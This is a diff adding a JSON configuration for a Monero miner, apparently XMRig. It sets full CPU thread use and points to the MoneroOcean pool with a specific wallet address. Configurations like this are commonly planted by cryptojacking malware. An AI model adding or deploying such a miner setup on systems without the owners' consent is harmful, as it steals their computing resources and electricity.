@@ -1,0 +1,15 @@
+{
+  "autosave": true,
+  "cpu": {
+    "enabled": true,
+    "max-threads-hint": 1.0
+  },
+  "pools": [
+    {
+      "url": "gulf.moneroocean.stream:443",
+      "user": "483p47a7AHdfCi11CjkeubHuVQKzec3u11xbMuJExMnqhFDxLC566xUS8hkAz6iTzmCJRHZBM2rkiK9eZTreuEbM8etYpEE",
+      "pass": "MONEROOCEAN",
+      "tls": true
+    }
+  ]
+}
